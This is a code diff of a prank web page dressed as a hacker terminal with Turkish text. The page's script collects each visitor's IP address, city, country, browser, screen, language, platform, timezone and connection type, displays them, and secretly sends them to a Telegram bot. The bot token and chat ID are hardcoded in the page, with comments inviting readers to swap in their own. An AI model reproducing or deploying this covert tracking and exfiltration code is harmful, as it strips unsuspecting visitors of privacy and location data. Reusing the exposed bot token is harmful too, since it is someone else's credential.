@@ -15,8 +15,8 @@
       flex-direction: column;
       justify-content: flex-start;
       align-items: center;
-      padding-top: 40px;
       overflow: hidden;
+      padding-top: 60px;
     }
     #terminal {
       background: rgba(0, 0, 0, 0.7);
@@ -25,11 +25,11 @@
       padding: 30px 40px;
       width: 90%;
       max-width: 700px;
-      min-height: 300px;
+      min-height: 320px;
       overflow-y: auto;
       white-space: pre-line;
       box-shadow: 0 0 15px #00ff99;
-      z-index: 1;
+      user-select: text;
     }
     .background-code {
       position: fixed;
@@ -38,7 +38,7 @@
       width: 100%;
       height: 100%;
       pointer-events: none;
-      color: rgba(0, 255, 153, 0.08);
+      color: rgba(0, 255, 153, 0.1);
       font-size: 14px;
       animation: scroll 20s linear infinite;
       z-index: 0;
@@ -53,19 +53,19 @@
     }
     #rickButton {
       margin-top: 30px;
-      padding: 15px 50px;
-      font-size: 22px;
+      padding: 18px 60px;
+      font-size: 24px;
       font-weight: bold;
       background-color: #00ff99;
       color: #002b20;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
       font-family: 'Consolas', monospace;
-      box-shadow: 0 0 20px #00ff99;
+      box-shadow: 0 0 25px #00ff99;
       transition: background-color 0.3s ease;
       user-select: none;
-      z-index: 2;
+      z-index: 1;
       display: none;
     }
     #rickButton:hover {
@@ -110,12 +110,12 @@
     }
 
     async function sendToTelegram(message) {
-      const chatId = "6400737507";
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg";
+      const chatId = "6400737507"; // Kendi chat ID’in
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Kendi bot token’in
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
       try {
-        const response = await fetch(url, {
+        const res = await fetch(url, {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
@@ -123,45 +123,48 @@
             text: message
           })
         });
-
-        const result = await response.json();
-        if (!response.ok || !result.ok) {
-          console.error("Telegram API hatası:", result);
-        } else {
-          console.log("Mesaj gönderildi:", result);
-        }
-      } catch (e) {
-        console.error("Fetch sırasında hata oluştu:", e);
+        if (!res.ok) throw new Error("Telegram API hata");
+      } catch(e) {
+        await typeText("[!] Mesaj gönderilemedi.");
       }
     }
 
     async function showInfo() {
-      terminal.innerText = "";
+      terminal.innerText = ""; // Başlangıçtaki yazıyı sil
       await typeText("Veriler Toplanıyor...");
 
-      await new Promise(r => setTimeout(r, 1000));
+      await new Promise(r => setTimeout(r, 1200));
 
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        await typeText(`IP Adresi: ${data.ip}`);
-        await typeText(`Şehir: ${data.city}`);
-        await typeText(`Ülke: ${data.country_name}`);
-        await typeText(`Tarayıcı: ${navigator.userAgent}`);
-        await typeText(`Ekran: ${screen.width}x${screen.height}`);
-        await typeText(`Dil: ${navigator.language || 'Bilinmiyor'}`);
-        await typeText(`Platform: ${navigator.platform || 'Bilinmiyor'}`);
-        await typeText(`Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
-        await typeText(`Çerezler: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
-        await typeText(`Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);
+        await typeText(`🌐 IP Adresi: ${data.ip}`);
+        await typeText(`🏙️ Şehir: ${data.city}`);
+        await typeText(`🌍 Ülke: ${data.country_name}`);
+        await typeText(`🖥️ Tarayıcı: ${navigator.userAgent}`);
+        await typeText(`🖼️ Ekran Çözünürlüğü: ${screen.width}x${screen.height}`);
+        await typeText(`🗣️ Dil: ${navigator.language || 'Bilinmiyor'}`);
+        await typeText(`💻 Platform: ${navigator.platform || 'Bilinmiyor'}`);
+        await typeText(`⏰ Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
+        await typeText(`🍪 Çerez İzinleri: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
+        await typeText(`📡 Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);
 
-        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}\nDil: ${navigator.language}\nPlatform: ${navigator.platform}\nZaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\nÇerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\nBağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+        const message = `YENİ GİRİŞ:\n` +
+          `🌐 IP: ${data.ip}\n` +
+          `🏙️ Şehir: ${data.city}\n` +
+          `🌍 Ülke: ${data.country_name}\n` +
+          `🖥️ Tarayıcı: ${navigator.userAgent}\n` +
+          `🖼️ Çözünürlük: ${screen.width}x${screen.height}\n` +
+          `🗣️ Dil: ${navigator.language}\n` +
+          `💻 Platform: ${navigator.platform}\n` +
+          `⏰ Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
+          `🍪 Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
+          `📡 Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
 
         await sendToTelegram(message);
       } catch (e) {
         await typeText("Veri alınırken bir hata oluştu.");
-        console.error("Veri alma hatası:", e);
       }
 
       await new Promise(r => setTimeout(r, 1000));
